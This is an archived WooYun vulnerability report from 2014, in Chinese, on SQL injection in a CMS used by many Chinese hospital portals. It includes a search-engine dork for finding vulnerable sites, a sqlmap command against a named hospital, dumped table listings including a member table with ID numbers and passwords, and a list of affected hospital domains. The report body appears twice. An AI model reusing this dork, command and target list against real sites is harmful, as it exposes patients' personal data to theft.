{"id": 60494, "wybug_id": "wooyun-2014-043075", "wybug_title": "浙江联众为多家医院建设的信息门户网站SQL注入漏洞", "wybug_corp": "浙江联众", "wybug_author": "Rubick", "wybug_date": "2014-02-27 11:41", "wybug_open_date": "2014-05-28 11:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-05-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 浙江联众智慧科技股份有限公司是面向大中华区（两岸四地全球华人社区）最权威的智慧医疗整体解决方案提供商和服务商。其为多家医院建设的信息门户网站存在SQL注入漏洞,导致大量医院数据存在泄露风险。 详细说明：  官网地址http://www.mediinfo.com.cn/软件漏洞位置../cms/Column.aspx?LMID=1google搜索关键字 inurl:cms/Column.aspx?LMID=\n\n没有找到现成的建站软件，以浙江省肿瘤医院为例漏洞地址http://www.zchospital.com/cms/Column.aspx?LMID=1测试出错判断存在注入\n\n尝试sqlmap注入sqlmap -u 'http://www.zchospital.com/cms/Column.aspx?LMID=1' --dbs -v 1\n\n当前数据库\n\n100多个表，上百万数据。Database: ZL_WW    +------------------+---------+| Table            | Entries |+------------------+---------+| CHECKED1         | 1231884 || AUDIT1           | 80367   || CHECK1           | 79774   || WW_MZYY          | 42487   || XT_HZK           | 28016   || WW_MZYYPB        | 25238   || WW_MEMBER        | 20868   || MZ_INFO          | 19725   || XT_XTRZ          | 12501   || RSGL_ZGDAJGXZ    | 9072    || OA_LYB           | 8625    || ZY_INFO          | 6538    || XT_GYDM          | 4447    || XT_FJ            | 3990    || WW_ZGDL          | 3286    || RSGZ_NDKH        | 3074    || OA_NR            | 2380    || RSGZ_ZGDA_TEST   | 2246    || RSGL_MYKQFB      | 2226    || OA_FWL           | 1899    || RSGL_ZGDALS      | 1286    || RSGL_ZCBD        | 1278    || XT_COLUMN        | 760     || WW_ZJCZBG        | 611     || RSGZ_XGJL        | 572     || OA_LMQX          | 515     || XT_XLSCOL        | 265     || RSGZ_GZTZ_DAT    | 264     || XT_ZHCXZD        | 256     || RSGZ_GZPTRY      | 241     || OA_TQYB          | 224     || AUDIT2           | 218     || XT_ZJLXS         | 218     || RSGZ_TG_XJGZ     | 210     || XT_XSFAMX        | 205     || XT_ZHCXSC        | 201     || XT_ZHCXTJ        | 196     || WW_JOB           | 182     || XT_KSDM          | 181     || WEB_ZJPB         | 167     || RSGL_KZFA        | 156     || XT_YHZQX         | 154     || XT_XTCS          | 153     || OA_RY            | 145     || XT_YHZCY         | 137     || RSGL_ZWBD        | 136     || RSGZ_XSL         | 135     || RSGL_ZGDAJG      | 108     || XT_DMTV          | 101     || XT_DMTVMX        | 98      || RSGZ_KJQJ        | 96      || XT_DHDY          | 96      || OA_LM            | 93      || XT_GYDMLB        | 90      || OA_MTDJ          | 84      || OA_RY1           | 80      || RSGZ_XSLXZ       | 78      || XT_TABLE         | 71      || XT_XHB           | 70      || RSGZ_GZPTXM      | 60      || RSGZ_DAGZ        | 59      || XT_GNMK          | 53      || XT_ZJMX          | 49      || RSGL_ZGDA        | 46      || XT_ZXYH          | 42      || RSGL_DRSZ        | 40      || OA_KS            | 37      || RSGZ_TG_GWGZ     | 35      || RSGZ_GZLBZG      | 32      || RSGZ_GZLBZG_XGJL | 32      || OA_GXSB          | 31      || RSGZ_GZTZ_COL    | 30      || RSGZ_GZLBXM      | 27      || XT_DMLB          | 24      || PBCATEDT         | 21      || PBCATFMT         | 20      || OA_TPZS          | 19      || WW_ZGDL_20100612 | 19      || XT_YHZXX         | 17      || RSGL_ZGYLZ       | 16      || RSGZ_GZXM        | 15      || XT_ZHCXFA        | 14      || XT_YBXX          | 13      || OA_YQLJ          | 12      || RSGL_YGJCJL      | 12      || XT_GYDMZDY       | 11      || XT_XLSTAB        | 11      || XT_ZHCXFL        | 11      || RSGZ_DBGS        | 10      || XT_ZHCXFZ        | 10      || OA_JSRY          | 9       || RSGL_XGJLMX      | 9       || RSGL_ZGDD        | 9       || WW_ZPGWGL        | 9       || RSGZ_GZPT        | 6       || XT_ZHCXBJGL      | 6       || RSGL_NXFA        | 5       || RSGL_XGJL        | 5       || XT_QXFL          | 5       || XT_QXMX          | 5       || XT_XSFA          | 5       || XT_ZDSX          | 5       || RSGZ_GZLB        | 4       || RSGZ_TG_GZLB     | 4       || XT_XTXX          | 4       || XT_ZDYSXMX       | 4       || OA_GLC           | 3       || OA_WJDC_DA       | 3       || RSGZ_GZTZ_TAB    | 3       || RSGZ_TZLB        | 3       || RSGZ_YHDM        | 3       || XT_ZHCXGLAN      | 3       || XT_JKFL          | 2       || XT_LJXX          | 2       || XT_ZDYSX         | 2       || OA_GG            | 1       || OA_JS            | 1       || OA_WJDC          | 1       || OA_WJDC_WT       | 1       || OA_XGLJ          | 1       || OA_YMZS          | 1       || RSGL_CSHLB       | 1       || RSGL_SXDY        | 1       || RSGL_YYXX        | 1       || RSGZ_NDPT        | 1       || XT_RWLB          | 1       || XT_YBFA          | 1       || XT_ZJ            | 1       |+------------------+---------+注册用户表Database: ZL_WW                                                                                                    Table: WW_MEMBER[18 columns]+----------+----------+| Column   | Type     |+----------+----------+| CSRQ     | DATE     || DZYJ     | VARCHAR2 || HDMM     | VARCHAR2 || JTZZ     | VARCHAR2 || JZKH     | VARCHAR2 || LXDH     | VARCHAR2 || MMWT     | VARCHAR2 || PASSWORD | VARCHAR2 || SFZH     | VARCHAR2 || USERNAME | VARCHAR2 || WTDA     | VARCHAR2 || XB       | VARCHAR2 || XM       | VARCHAR2 || YBKH     | VARCHAR2 || YHID     | VARCHAR2 || YHLB     | NUMBER   || YMKH     | VARCHAR2 || ZT       | NUMBER   |+----------+----------+几万条注册用户信息（身份证，姓名，用户名密码等\n\n受影响的网站浙江省肿瘤医院www.zchospital.com/cms/浙江衢化医院www.zjqhyy.com/cms/浙江护理www.zjhl.org/cms义乌市中心医院|中心医院www.ywzxyy.com/cms/浙江大学医学院附属第二医院www.z2hospital.com/cms浙江省立同德医院www.zjtongde.com/cms/昆山市第二人民医院www.ks2y.com/cms/宁海县第一医院nhdyyy.com/cms/海宁市中医院www.hnzyy.cn/cms/浙医一院肾脏病中心www.zjukidney.com/cms/浙医一院肾脏病中心www.zjukidney.com/cms/......等大量医院数据存在风险。   漏洞证明：  漏洞位置../cms/Column.aspx?LMID=1google搜索关键字 inurl:cms/Column.aspx?LMID=\n\n没有现成的建站软件，以浙江省肿瘤医院为例漏洞地址http://www.zchospital.com/cms/Column.aspx?LMID=1测试出错判断存在注入\n\n尝试sqlmap注入sqlmap -u 'http://www.zchospital.com/cms/Column.aspx?LMID=1' --dbs -v 1\n\n当前数据库\n\n100多个表，上百万数据。Database: ZL_WW    +------------------+---------+| Table            | Entries |+------------------+---------+| CHECKED1         | 1231884 || AUDIT1           | 80367   || CHECK1           | 79774   || WW_MZYY          | 42487   || XT_HZK           | 28016   || WW_MZYYPB        | 25238   || WW_MEMBER        | 20868   || MZ_INFO          | 19725   || XT_XTRZ          | 12501   || RSGL_ZGDAJGXZ    | 9072    || OA_LYB           | 8625    || ZY_INFO          | 6538    || XT_GYDM          | 4447    || XT_FJ            | 3990    || WW_ZGDL          | 3286    || RSGZ_NDKH        | 3074    || OA_NR            | 2380    || RSGZ_ZGDA_TEST   | 2246    || RSGL_MYKQFB      | 2226    || OA_FWL           | 1899    || RSGL_ZGDALS      | 1286    || RSGL_ZCBD        | 1278    || XT_COLUMN        | 760     || WW_ZJCZBG        | 611     || RSGZ_XGJL        | 572     || OA_LMQX          | 515     || XT_XLSCOL        | 265     || RSGZ_GZTZ_DAT    | 264     || XT_ZHCXZD        | 256     || RSGZ_GZPTRY      | 241     || OA_TQYB          | 224     || AUDIT2           | 218     || XT_ZJLXS         | 218     || RSGZ_TG_XJGZ     | 210     || XT_XSFAMX        | 205     || XT_ZHCXSC        | 201     || XT_ZHCXTJ        | 196     || WW_JOB           | 182     || XT_KSDM          | 181     || WEB_ZJPB         | 167     || RSGL_KZFA        | 156     || XT_YHZQX         | 154     || XT_XTCS          | 153     || OA_RY            | 145     || XT_YHZCY         | 137     || RSGL_ZWBD        | 136     || RSGZ_XSL         | 135     || RSGL_ZGDAJG      | 108     || XT_DMTV          | 101     || XT_DMTVMX        | 98      || RSGZ_KJQJ        | 96      || XT_DHDY          | 96      || OA_LM            | 93      || XT_GYDMLB        | 90      || OA_MTDJ          | 84      || OA_RY1           | 80      || RSGZ_XSLXZ       | 78      || XT_TABLE         | 71      || XT_XHB           | 70      || RSGZ_GZPTXM      | 60      || RSGZ_DAGZ        | 59      || XT_GNMK          | 53      || XT_ZJMX          | 49      || RSGL_ZGDA        | 46      || XT_ZXYH          | 42      || RSGL_DRSZ        | 40      || OA_KS            | 37      || RSGZ_TG_GWGZ     | 35      || RSGZ_GZLBZG      | 32      || RSGZ_GZLBZG_XGJL | 32      || OA_GXSB          | 31      || RSGZ_GZTZ_COL    | 30      || RSGZ_GZLBXM      | 27      || XT_DMLB          | 24      || PBCATEDT         | 21      || PBCATFMT         | 20      || OA_TPZS          | 19      || WW_ZGDL_20100612 | 19      || XT_YHZXX         | 17      || RSGL_ZGYLZ       | 16      || RSGZ_GZXM        | 15      || XT_ZHCXFA        | 14      || XT_YBXX          | 13      || OA_YQLJ          | 12      || RSGL_YGJCJL      | 12      || XT_GYDMZDY       | 11      || XT_XLSTAB        | 11      || XT_ZHCXFL        | 11      || RSGZ_DBGS        | 10      || XT_ZHCXFZ        | 10      || OA_JSRY          | 9       || RSGL_XGJLMX      | 9       || RSGL_ZGDD        | 9       || WW_ZPGWGL        | 9       || RSGZ_GZPT        | 6       || XT_ZHCXBJGL      | 6       || RSGL_NXFA        | 5       || RSGL_XGJL        | 5       || XT_QXFL          | 5       || XT_QXMX          | 5       || XT_XSFA          | 5       || XT_ZDSX          | 5       || RSGZ_GZLB        | 4       || RSGZ_TG_GZLB     | 4       || XT_XTXX          | 4       || XT_ZDYSXMX       | 4       || OA_GLC           | 3       || OA_WJDC_DA       | 3       || RSGZ_GZTZ_TAB    | 3       || RSGZ_TZLB        | 3       || RSGZ_YHDM        | 3       || XT_ZHCXGLAN      | 3       || XT_JKFL          | 2       || XT_LJXX          | 2       || XT_ZDYSX         | 2       || OA_GG            | 1       || OA_JS            | 1       || OA_WJDC          | 1       || OA_WJDC_WT       | 1       || OA_XGLJ          | 1       || OA_YMZS          | 1       || RSGL_CSHLB       | 1       || RSGL_SXDY        | 1       || RSGL_YYXX        | 1       || RSGZ_NDPT        | 1       || XT_RWLB          | 1       || XT_YBFA          | 1       || XT_ZJ            | 1       |+------------------+---------+注册用户表Database: ZL_WW                                                                                                    Table: WW_MEMBER[18 columns]+----------+----------+| Column   | Type     |+----------+----------+| CSRQ     | DATE     || DZYJ     | VARCHAR2 || HDMM     | VARCHAR2 || JTZZ     | VARCHAR2 || JZKH     | VARCHAR2 || LXDH     | VARCHAR2 || MMWT     | VARCHAR2 || PASSWORD | VARCHAR2 || SFZH     | VARCHAR2 || USERNAME | VARCHAR2 || WTDA     | VARCHAR2 || XB       | VARCHAR2 || XM       | VARCHAR2 || YBKH     | VARCHAR2 || YHID     | VARCHAR2 || YHLB     | NUMBER   || YMKH     | VARCHAR2 || ZT       | NUMBER   |+----------+----------+几万条注册用户信息（身份证，姓名，用户名密码等）存在泄露风险\n\n受影响的网站浙江省肿瘤医院www.zchospital.com/cms/浙江衢化医院www.zjqhyy.com/cms/浙江护理www.zjhl.org/cms义乌市中心医院|中心医院www.ywzxyy.com/cms/浙江大学医学院附属第二医院www.z2hospital.com/cms浙江省立同德医院www.zjtongde.com/cms/昆山市第二人民医院www.ks2y.com/cms/宁海县第一医院nhdyyy.com/cms/海宁市中医院www.hnzyy.cn/cms/浙医一院肾脏病中心www.zjukidney.com/cms/浙医一院肾脏病中心www.zjukidney.com/cms/......等   修复方案：  严格过滤字符，升级系统。求礼物。   版权声明：转载请注明来源 Rubick@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}